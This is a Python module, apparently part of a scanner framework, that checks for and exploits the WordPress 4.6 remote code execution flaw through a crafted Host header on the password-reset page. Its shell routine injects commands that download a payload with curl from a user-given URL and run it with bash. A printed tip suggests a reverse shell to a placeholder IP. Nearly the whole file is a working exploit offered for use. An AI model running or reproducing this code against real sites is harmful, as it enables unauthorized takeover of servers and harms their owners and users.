#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
import requests
class Wordpress4_6_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        OutPrintInfo("WordPress", "开始检测WordPress-4.6-Rce...")
        url2 = url + '/wp-login.php?action=lostpassword'
        header = {
            "Host": "target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}awesome_poc}} null)",
            "User-Agent": self.header,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            'user_login': self.admin,
            'redirect_to': '',
            'wp-submit': 'Get New Password'
        }
        try:
            req = requests.post(url2, timeout=3,data=data,verify=self.verify,proxies=self.proxy,headers=header)
            if req.status_code == 302:
                OutPrintInfo("WordPress", f"[b bright_red]可能存在WordPress-4.6-Rce")
                OutPrintInfo("WordPress", url2)
            return True
        except:
            OutPrintInfo("WordPress", "不存在WordPress-4.6-Rce")
            return False

    def generate_command(self,command):
        command = '${run{%s}}' % command
        command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
        command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
        return 'target(any -froot@localhost -be %s null)' % command
    def shell(self,target,shell_url):
        session = requests.session()
        data = {
            'user_login': self.admin,
            'redirect_to': '',
            'wp-submit': 'Get New Password'
        }
        session.headers = {
            'Host': self.generate_command('/usr/bin/curl -o/tmp/rce ' + shell_url),
            'User-Agent': self.header
        }
        session.allow_redirects = False
        target += '/wp-login.php?action=lostpassword'
        session.post(target, data=data)

        session.headers['Host'] = self.generate_command('/bin/bash /tmp/rce')
        session.post(target, data=data)
    def main(self,target):
        url = target["url"].strip('/ ')
        proxy = target["proxy"]
        self.header = target["header"]
        self.verify = target["ssl"]
        self.admin = target["adminname"]

        _, self.proxy = ReqSet(proxy=proxy)


        if self.send_payload(url):
            choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
            if choose == "y":
                OutPrintInfo("WordPress", "需要一个你放置payload的网址")
                OutPrintInfo("WordPress", "例如example.com/shell.sh")
                OutPrintInfo("WordPress", "shell.sh内容可为bash -i >& /dev/tcp/your-reverse—shell-ip/9999 0>&1")
                ip = Prompt.ask("[b yellow]输入你放置payload的网址(不包含http://服务信息)")

                self.shell(url,ip)
                OutPrintInfo("WordPress", f"[b bright_red]执行完成,检测监听端口")

            else:
                return
        OutPrintInfo("WordPress", "WordPress-4.6-Rce检测结束")
